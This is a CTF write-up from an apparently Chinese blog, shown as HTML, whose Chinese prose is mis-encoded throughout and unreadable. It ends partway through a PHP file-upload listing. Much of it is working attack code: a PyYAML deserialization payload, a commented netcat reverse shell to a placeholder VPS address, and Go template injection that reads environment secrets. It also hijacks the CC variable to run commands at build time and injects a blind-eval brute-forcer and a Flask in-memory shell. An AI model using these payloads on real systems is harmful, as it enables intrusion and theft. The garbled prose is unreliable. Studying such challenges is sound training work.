<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># ç›®æ ‡URL - è¯·ä¿®æ”¹ä¸ºå®é™…ç›®æ ‡</span><br><span class="line">target_url = &quot;http://target.com:8000/uneed1t&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 1. ä»»æ„æ–‡ä»¶è¯»å–</span><br><span class="line">payload = &quot;&quot;&quot;!!python/object/apply:subprocess.Popen</span><br><span class="line">- [&quot;sh&quot;,&quot;-c&quot;,&quot;cat /f* &gt;1.txt&quot;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 2. åå¼¹shell</span><br><span class="line"># payload = &quot;&quot;&quot;!!python/object/apply:subprocess.call</span><br><span class="line"># [[&#x27;/bin/busybox&#x27;,&#x27;nc&#x27;,&#x27;YOUR_VPS_IP&#x27;,&#x27;YOUR_PORT&#x27;,&#x27;-e&#x27;,&#x27;/bin/sh&#x27;]]</span><br><span class="line"># &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># ç¼–ç å¹¶å‘é€è¯·æ±‚</span><br><span class="line">encoded_payload = urllib.parse.quote(payload)</span><br><span class="line">full_url = f&quot;&#123;target_url&#125;?data=&#123;encoded_payload&#125;&quot;</span><br><span class="line"></span><br><span class="line">response = requests.get(full_url)</span><br><span class="line">print(f&quot;çŠ¶æ€ç : &#123;response.status_code&#125;&quot;)</span><br><span class="line">print(f&quot;å“åº”: &#123;response.text&#125;&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="VIP"><a href="#VIP" class="headerlink" title="VIP"></a><strong>VIP</strong></h3><h4 id="è€ƒç‚¹ï¼šgo-ssti-åŠ«æŒç¯å¢ƒå˜é‡ææƒ"><a href="#è€ƒç‚¹ï¼šgo-ssti-åŠ«æŒç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="è€ƒç‚¹ï¼šgo ssti+åŠ«æŒç¯å¢ƒå˜é‡ææƒ"></a>è€ƒç‚¹ï¼šgo ssti+åŠ«æŒç¯å¢ƒå˜é‡ææƒ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬å…¨æ–°çš„PaaSå¹³å°æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„Goæ¨¡æ¿æœåŠ¡ä½œä¸ºå…è´¹å¥—é¤ã€‚å¯¹äºæˆ‘ä»¬çš„VIPå®¢æˆ·ï¼Œæˆ‘ä»¬è¿˜æä¾›äº†ä¸€é¡¹ä¸“å±åŠŸèƒ½ï¼šä¸€ä¸ªç‹¬ç«‹çš„åœ¨çº¿Goç¼–è¯‘å™¨ï¼</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/Joooook/p/18089714</span><br><span class="line">https://xz.aliyun.com/news/15003</span><br></pre></td></tr></table></figure>

<p>ç»™äº†æºç ï¼Œæ¥çœ‹çœ‹ä»€ä¹ˆæ ·çš„ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰ä¸€ä¸ªapié‰´æƒä¸­é—´ä»¶ï¼ŒæœåŠ¡å¯åŠ¨æ—¶å¿…é¡» export API_KEY=xxxxxxxxï¼Œå¦åˆ™ panicã€‚Gin ä¸­é—´ä»¶å‡½æ•°ï¼šå–è¯·æ±‚å¤´ X-API-Key â†’ ä¸åå°æ¯”å¯¹ â†’ ä¸å¯¹å°± 401 æ‰“æ–­</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112125915544.png" alt="image-20251112125915544"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚æ–¹å¼å’Œå½¢å¼ POSTï¼Œjson</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112130237633.png" alt="image-20251112130237633"></p>
<p>åªæœ‰&#x2F;buildè·¯ç”±è¿›è¡Œäº†apié‰´æƒ</p>
<p><img src="/../images/image-20251112143715466.png" alt="image-20251112143715466"></p>
<p>å…³é”®æ¸²æŸ“æ¨¡æ¿ç‚¹åœ¨<code>/api</code> æ¥å£æŠŠç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼è¿› template åšæ¸²æŸ“ï¼Œå¯è¿œç¨‹æ‰§è¡Œä»»æ„æ¨¡æ¿è¯­æ³• </p>
<p><img src="/../images/image-20251112143959688.png" alt="image-20251112143959688"></p>
<p>æ¨¡æ¿æ¸²æŸ“ï¼Œç”¨Utilsâ¾¥çš„GetReaderå‡½æ•°è¯»â½‚ä»¶ï¼Œè·å¾—X-API-Key</p>
<p><img src="/../images/image-20251112165010588.png" alt="image-20251112165010588"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; .Utils.GetReader &quot;/proc/self/environ&quot; | .Utils.ReadAll &#125;&#125; å°†ç¯å¢ƒå˜é‡å…¨éƒ¨è¯»å‡ºæ¥ï¼Œå‘ç°æœ‰ä¸ª/app/secret_key.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112165049976.png" alt="image-20251112165049976"></p>
<p><img src="/../images/image-20251112165131900.png" alt="image-20251112165131900"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå°±æ‹¿åˆ°äº†X-API-Keyï¼Œå°±å¯ä»¥è¿‡äº†&#x2F;vip&#x2F;buildçš„é‰´æƒæ§åˆ¶éƒ¨åˆ†ï¼Œåˆ°äº†buildHandleréƒ¨åˆ†</p>
<p><img src="/../images/image-20251112172922246.png" alt="image-20251112172922246"></p>
<p>å°†ç”¨æˆ·çš„è¾“å…¥æºç å’Œç¯å¢ƒå˜é‡åŸå°ä¸åŠ¨ã€ä¿¡ä»»çŠ¶æ€ã€‘çš„å†™ç›˜å’Œç¼–è¯‘ï¼ŒæˆåŠŸå°±ä¸‹è½½ç›¸åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¤±è´¥è¿”å›å›æ˜¾</p>
<p>ä½†æ˜¯æ­£å¸¸å†™å…¥goæºç å½“ä¸­å¹¶ä¸ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œè®¾ç½®â€CGO_ENABLEDâ€: â€œ1â€ï¼Œgo buildå°±ä¼šè°ƒç”¨å¤–éƒ¨ C ç¼–è¯‘å™¨(é»˜è®¤æ˜¯ <code>gcc</code>ï¼‰</p>
<p>æ—¢å¯ä»¥ç†è§£ç­‰äº build è¿›ç¨‹å…ˆå¸®æˆ‘ä»¬æ‰§è¡Œä»»æ„å‘½ä»¤ã€ä½†æ˜¯ç»“æœä¸èƒ½å›æ˜¾ã€‘ï¼Œç„¶åè½ç›˜åˆ°å›ºå®šç¼–è¯‘çš„ç›®å½•&#x2F;buildä¸‹</p>
<p>è¿ç”¨go:embedã€å®ƒå…è®¸å¼€å‘è€…åœ¨ç¼–è¯‘æ—¶å°†é™æ€èµ„æºæ–‡ä»¶åµŒå…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‘ï¼Œå°†ä¸å‡ºç½‘çš„æ‰§è¡Œå‘½ä»¤ç»“æœè¿›è¡Œæ˜¾ç¤º</p>
<p>å°†å¯è¯»å¯å†™çš„æ–‡ä»¶ã€å¯èƒ½å«æœ‰flagã€‘å†™å…¥åˆ°s.txtç„¶ådumpä¸‹æ¥äºŒè¿›åˆ¶æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;CC&quot;: &quot;/bin/sh -c &#x27;find / -type f -perm /4000 2&gt;/dev/null &gt; /tmp/build/s.txt; gcc \&quot;$@\&quot;&#x27; gcc-shim&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\n\nimport (\n\t\&quot;embed\&quot;\n\t\&quot;os\&quot;\n)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() &#123;\n\tos.Stdout.Write(f)\n&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112191029341.png" alt="image-20251112191029341"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;CC&quot;: &quot;/bin/sh -c &#x27;/usr/local/bin/flagread /flag.txt &gt; /tmp/build/flag.txt; gcc \&quot;$@\&quot;&#x27; gcc-shim&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\n\nimport (\n\t\&quot;embed\&quot;\n\t\&quot;os\&quot;\n)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() &#123;\n\tos.Stdout.Write(f)\n&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†dumpä¸‹æ¥çš„æ–‡ä»¶æœç´ flagæˆ–è€… å¸¸è§„æ¥è¯´åº”è¯¥ä¼šå‡ºç°åƒwpä¸€æ ·çš„æ–‡ä»¶è·¯åŠ²ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾åˆ°ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<p><img src="/../images/image-20251112192018461.png" alt="image-20251112192018461"></p>
<p><img src="/../images/image-20251112191046950.png" alt="image-20251112191046950"></p>
<p>åé¢å’Œä¸Šé¢ä¸€æ ·å°†ç›¸åº”åœ°å€ä¸‹çš„flagæ–‡ä»¶dumpä¸‹æ¥æ‰¾flagå°±å¥½äº† ä½†æ˜¯ä¾æ—§æ²¡æœ‰æ‰¾åˆ°ï¼Œå¯èƒ½ç¯å¢ƒå‡ºé—®é¢˜ã€ä¸æ‡‚ã€‘</p>
<p><img src="/../images/image-20251112192141963.png" alt="image-20251112192141963"></p>
<p><img src="/../images/image-20251112191657594.png" alt="image-20251112191657594"></p>
<p>ä¸ªäººæ„Ÿè§‰æ­£å¸¸æ¥è¯´åº”è¯¥æ˜¯å‘Šè¯‰äº†flagæ–‡ä»¶è·¯åŠ²ï¼Œç„¶ååœ¨æ¨¡æ¿æ¸²æŸ“æ‰“çš„ä»»æ„æ–‡ä»¶è¯»å–çš„æ—¶å€™ï¼ŒæŸ¥æ‰¾å‘ç°æ²¡æœ‰æƒé™ï¼Œæ‰ä¼šæœ‰æƒ³åˆ°åŠ«æŒç¯å¢ƒå˜é‡ä¸­çš„ccæ¥è¿›è¡Œææƒè¿›è¡Œrceæ¥è¯»å–flagï¼Œä½†æ˜¯wpæ²¡æœ‰è¿™ä¸€å—å°±æ˜¾å¾—ä¸å¤ªè¿è´¯ã€æœ‰æåˆ°ä¸€å˜´ä½†æ˜¯å¤ç°çš„æ—¶å€™æ²¡æœ‰æ„Ÿå—å‡ºæ¥ã€‘ï¼Œåƒä¸‹é¢æŸ¥è¯¢flagç„¶åå¼¹å‡ºæƒé™ä¸å¤Ÿä¹‹ç±»çš„ã€å¤ç°çš„æ—¶å€™æ²¡æœ‰å‡ºç°flagï¼Œæ²¡åŠæ³•éªŒè¯ã€‘ï¼Œç„¶åå†æ‹¿ç€keyå»è¿›è¡Œæ„é€ payloadåˆç†ä¸€ç‚¹ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘å¤ç°çš„æ—¶å€™å¤±è¯¯äº†ï¼Œè·³è¿‡äº†ï¼Œå˜»å˜»</p>
<p><img src="/../images/image-20251112194342982.png" alt="image-20251112194342982"></p>
<p><img src="/../images/image-20251112193943019.png" alt="image-20251112193943019"></p>
<h3 id="è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°"><a href="#è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°" class="headerlink" title="è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°"></a>è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°</h3><h4 id="è€ƒç‚¹ï¼šPython-Flaskå†…å­˜é©¬"><a href="#è€ƒç‚¹ï¼šPython-Flaskå†…å­˜é©¬" class="headerlink" title="è€ƒç‚¹ï¼šPython Flaskå†…å­˜é©¬"></a>è€ƒç‚¹ï¼šPython Flaskå†…å­˜é©¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡è§è¿‡ï¼Ÿæœä¸€ä¸‹ï¼åœ¨/flag</span><br></pre></td></tr></table></figure>

<p>ç†Ÿæ‚‰çš„é¡µé¢ï¼Œç†Ÿæ‚‰çš„ç›®å½•æ‰«æï¼Œç†Ÿæ‚‰çš„&#x2F;srcï¼Œä¸ä¸€æ ·çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/doit&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def doit():</span><br><span class="line">    e=request.form.get(&#x27;e&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        eval(e)</span><br><span class="line">        return &quot;done!&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;error!&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure>

<p>å…³æ³¨ç‚¹åœ¨&#x2F;doitè·¯ç”±ä¸‹é¢çš„eval(e)ã€eval()å‡½æ•°â½¤æ¥æ‰§â¾â¼€ä¸ªå­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›è¡¨è¾¾å¼çš„å€¼ã€‚ã€‘æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/../images/image-20251112194838981.png" alt="image-20251112194838981"></p>
<p>å°è¯•æ‰§è¡Œå‘½ä»¤å’Œæºç æ˜¾ç¤ºçš„ä¸€æ ·ï¼Œæ˜¾ç¤ºdoneæ— å›æ˜¾</p>
<p><img src="/../images/image-20251112200056348.png" alt="image-20251112200056348"></p>
<p>çˆ†ç ´ã€å¸ƒå°”ç›²æ³¨åŸç†ã€‘:</p>
<p>å®˜æ–¹wpå½“ä¸­çš„è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30667/doit&quot;</span><br><span class="line">chars = &quot;_-&#123;&#125;!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    for c in chars:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            &#x27;e&#x27;: f&#x27;__import__(&quot;os&quot;).system(&quot;&quot;) if open(&quot;/flag&quot;).read()[&#123;i-1&#125;] == &quot;&#123;c&#125;&quot; else 1/0&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        if &quot;done!&quot; in r.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        break  # å†…å±‚ for æ­£å¸¸ç»“æŸï¼ˆæœªæ‰¾åˆ°å­—ç¬¦ï¼‰ï¼Œè®¤ä¸º flag å·²ç»“æŸ</span><br><span class="line"></span><br><span class="line">print(&quot;Final flag:&quot;, flag)</span><br></pre></td></tr></table></figure>

<p>å†…å­˜é©¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/13858</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30667&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 1. æ³¨å…¥å†…å­˜é©¬</span><br><span class="line">url1 = f&quot;&#123;url&#125;/doit&quot;</span><br><span class="line">payload = &#123;</span><br><span class="line">    &#x27;e&#x27;: r&quot;&quot;&quot;eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;&quot;&quot;</span><br><span class="line">         r&quot;&quot;&quot;.before_request_funcs.setdefault(None,[]).append(&quot;&quot;&quot;</span><br><span class="line">         r&quot;&quot;&quot;lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;o&#x27;)).read())&quot;)&quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url1, data=payload, headers=headers)</span><br><span class="line">print(&quot;æ³¨å…¥å“åº”ï¼š&quot;, r.text)</span><br><span class="line"></span><br><span class="line"># 2. åˆ©ç”¨å†…å­˜é©¬æ‰§è¡Œå‘½ä»¤</span><br><span class="line">url2 = f&quot;&#123;url&#125;/?o=cat /flag&quot;</span><br><span class="line">r = requests.get(url2, headers=headers)   # æ³¨æ„ï¼šè¿™é‡Œåº”è¯¥æ˜¯ GET</span><br><span class="line">print(&quot;æ‰§è¡Œç»“æœï¼š&quot;, r.text)</span><br></pre></td></tr></table></figure>

<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="ã€æœªå®Œæˆã€‘Road-to-Hero"><a href="#ã€æœªå®Œæˆã€‘Road-to-Hero" class="headerlink" title="ã€æœªå®Œæˆã€‘Road to Hero"></a><strong>ã€æœªå®Œæˆã€‘Road to Hero</strong></h3><h4 id="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡"><a href="#è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡"></a>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡</h4><h3 id="ã€æœªå®Œæˆã€‘ez-Ref"><a href="#ã€æœªå®Œæˆã€‘ez-Ref" class="headerlink" title="ã€æœªå®Œæˆã€‘ez_Ref"></a>ã€æœªå®Œæˆã€‘<strong>ez_Ref</strong></h3><h4 id="è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜"><a href="#è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜" class="headerlink" title="è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜"></a>è€ƒç‚¹ï¼šç®€å•çš„<strong>java</strong>ååºåˆ—åŒ–é¢˜</h4><h3 id="æ¥getshellé€Ÿåº¦"><a href="#æ¥getshellé€Ÿåº¦" class="headerlink" title="æ¥getshellé€Ÿåº¦!"></a><strong>æ¥</strong>getshellé€Ÿåº¦!</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getshellå°±å®Œäº†ï¼Ÿï¼Ÿæƒ³å•¥å‘¢bro</span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ"><a href="#è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ" class="headerlink" title="è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ"></a>è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ</h4><p>åº”è¯¥æ˜¯æ¨¡ä»¿ç»™çš„é“¾æ¥å‡ºçš„é¢˜ç›®ï¼Œæ–°å§¿åŠ¿</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/18584</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™çš„æºç æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å’ŒåŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$allowed_extensions = [&#x27;zip&#x27;, &#x27;bz2&#x27;, &#x27;gz&#x27;, &#x27;xz&#x27;, &#x27;7z&#x27;];</span><br><span class="line">$allowed_mime_types = [</span><br><span class="line">    &#x27;application/zip&#x27;,</span><br><span class="line">    &#x27;application/x-bzip2&#x27;,</span><br><span class="line">    &#x27;application/gzip&#x27;,</span><br><span class="line">    &#x27;application/x-gzip&#x27;,</span><br><span class="line">    &#x27;application/x-xz&#x27;,</span><br><span class="line">    &#x27;application/x-7z-compressed&#x27;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function filter($tempfile)</span><br><span class="line">&#123;</span><br><span class="line">    $data = file_get_contents($tempfile);</span><br><span class="line">    if (</span><br><span class="line">        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||</span><br><span class="line">        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false</span><br><span class="line">    ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123;</span><br><span class="line">    if (is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">        if (filter($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !isset($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">            die(&quot;Nope :&lt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // mimetype check</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $mime_type = 